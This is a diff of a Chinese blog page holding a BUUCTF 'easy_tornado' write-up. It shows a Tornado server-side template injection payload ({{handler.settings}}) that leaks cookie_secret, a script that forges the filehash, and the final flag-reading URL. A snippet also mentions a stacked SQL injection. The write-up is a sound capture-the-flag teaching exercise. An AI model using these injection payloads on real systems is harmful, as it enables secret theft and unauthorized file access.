@@ -8,13 +8,13 @@
     <meta name="description" content="打开环境
 
 有三个页面，挨个访问看看
-1/flag.txt
+/flag.txt
 
-1/welcome.txt
+/welcome.txt
 
-1/hints.txt
+/hints.txt
 开始分析第一个页面告诉我们flag in /fllllllllllllaghint告诉我们
-1md5(cookie_secr">
+md5(cookie_secret+m">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -478,7 +478,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    378
+                    375
                 </div>
                 
 
@@ -504,25 +504,36 @@
                 <p>打开环境<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/1.jpg" alt=""></p>
 <a id="more"></a>
 <p>有三个页面，挨个访问看看</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flag.txt</span><br></pre></td></tr></tbody></table></figure>
+<pre class=" language-bash"><code class="language-bash">/flag.txt</code></pre>
 <p><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/2.jpg" alt=""></p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/welcome.txt</span><br></pre></td></tr></tbody></table></figure>
+<pre class=" language-bash"><code class="language-bash">/welcome.txt</code></pre>
 <p><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/3.jpg" alt=""></p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/hints.txt</span><br></pre></td></tr></tbody></table></figure>
+<pre class=" language-bash"><code class="language-bash">/hints.txt</code></pre>
 <p><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/4.jpg" alt=""><br>开始分析<br>第一个页面告诉我们flag in /fllllllllllllag<br>hint告诉我们</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></tbody></table></figure>
+<pre class=" language-bash"><code class="language-bash">md5<span class="token punctuation">(</span>cookie_secret+md5<span class="token punctuation">(</span>filename<span class="token punctuation">))</span></code></pre>
 <p>也就是filename的md5值加上cookie_secret再md5<br>我们想要进入到fllllllllllllag，filename已经知道了，剩下cookie_secret不知道<br>在测试的过程中，会出现这样一个页面</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://0bcfd0a4-e28e-441c-be11-1fe0c4b7afa1.node3.buuoj.cn/error?msg=Error</span><br></pre></td></tr></tbody></table></figure>
+<pre class=" language-bash"><code class="language-bash">http://0bcfd0a4-e28e-441c-be11-1fe0c4b7afa1.node3.buuoj.cn/error?msg<span class="token operator">=</span>Error</code></pre>
 <p>通过百度知道<br>tornado是python中的一个web应用框架<br>render是python中的一个渲染函数，渲染变量到模板中，即可以通过传递不同的参数形成不同的页面。<br>再加上error?msg=Error这个页面<br>怀疑存在<a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">服务端模板注入攻击(SSTI)</a><br>经过测试，确实存在模板注入<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/5.jpg" alt=""><br>然后通过查阅各种资料，发现对于tornado框架存在附属文件handler.settings<br>(<a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="noopener">https://www.cnblogs.com/bwangel23/p/4858870.html</a>)<br>payload为</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://0bcfd0a4-e28e-441c-be11-1fe0c4b7afa1.node3.buuoj.cn/error?msg={{handler.settings}}</span><br></pre></td></tr></tbody></table></figure>
+<pre class=" language-bash"><code class="language-bash">http://0bcfd0a4-e28e-441c-be11-1fe0c4b7afa1.node3.buuoj.cn/error?msg<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>handler.settings<span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>
 <p>得到cookie_secret</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'cookie_secret'</span>: <span class="string">'c9c4e7d6-252c-47f9-a4d2-c2d67afcd4b7'</span>}</span><br></pre></td></tr></tbody></table></figure>
+<pre class=" language-bash"><code class="language-bash"><span class="token string">'cookie_secret'</span><span class="token keyword">:</span> <span class="token string">'c9c4e7d6-252c-47f9-a4d2-c2d67afcd4b7'</span><span class="token punctuation">}</span></code></pre>
 <p>然后写一个脚本得到最后的filehash</p>
-<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(str)</span>:</span></span><br><span class="line">    md5=hashlib.md5()</span><br><span class="line">    md5.update(str.encode(<span class="string">'utf8'</span>))</span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    filename=<span class="string">'/fllllllllllllag'</span></span><br><span class="line">    cookie_secret=<span class="string">'c9c4e7d6-252c-47f9-a4d2-c2d67afcd4b7'</span></span><br><span class="line">    print(md5(cookie_secret+md5(filename)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlib
+<span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    md5<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    md5<span class="token punctuation">.</span>update<span class="token punctuation">(</span>str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> md5<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    filename<span class="token operator">=</span><span class="token string">'/fllllllllllllag'</span>
+    cookie_secret<span class="token operator">=</span><span class="token string">'c9c4e7d6-252c-47f9-a4d2-c2d67afcd4b7'</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>md5<span class="token punctuation">(</span>cookie_secret<span class="token operator">+</span>md5<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
 <p>最后的filehash为</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">16a4ec873339e7847bf28e0e0b33803e</span><br></pre></td></tr></tbody></table></figure>
+<pre class=" language-bash"><code class="language-bash">16a4ec873339e7847bf28e0e0b33803e</code></pre>
 <p>然后构造payload为</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://0bcfd0a4-e28e-441c-be11-1fe0c4b7afa1.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=16a4ec873339e7847bf28e0e0b33803e</span><br></pre></td></tr></tbody></table></figure>
+<pre class=" language-bash"><code class="language-bash">http://0bcfd0a4-e28e-441c-be11-1fe0c4b7afa1.node3.buuoj.cn/file?filename<span class="token operator">=</span>/fllllllllllllag<span class="token operator">&amp;</span>filehash<span class="token operator">=</span>16a4ec873339e7847bf28e0e0b33803e</code></pre>
 <p>得到flag<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/6.jpg" alt=""></p>
 <script>
         document.querySelectorAll('.github-emoji')
@@ -797,7 +808,7 @@
 这题和强网杯随便注一样，都是堆叠注入通过show tables可以看到Flag表但想要看到列就不行了通过burpfuzz一下，能看到过滤了挺多关键字的
 
 有点难顶，只能看wp了
-1官方解:1;set sql_mode=pipes_as_
+官方解:1;set sql_mode=pipes_as_c
                         
                     </div>
                     <div class="publish-info">
